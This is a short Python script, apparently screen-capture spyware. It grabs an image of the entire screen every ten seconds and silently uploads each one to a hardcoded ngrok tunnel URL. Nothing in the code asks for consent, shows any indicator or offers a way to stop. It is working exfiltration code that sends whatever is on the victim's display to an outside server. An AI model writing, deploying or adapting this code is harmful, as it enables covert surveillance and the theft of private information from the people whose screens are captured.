import io
import time
import threading
import requests
from PIL import ImageGrab

SERVER_URL = "  https://fc31366ad73b.ngrok-free.app/upload"

running = True

def take_screenshot():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    return buf

def send():
    try:
        screenshot = take_screenshot()
        files = {"screenshot": ("screen.png", screenshot, "image/png")}
        requests.post(SERVER_URL, files=files)
        print("Screenshot sent")
    except Exception as e:
        print("Error:", e)

def background_sender():
    while running:
        send()
        time.sleep(10)

   
if __name__=='__main__':
    # t = threading.Thread(target=background_sender, daemon=True)
     background_sender()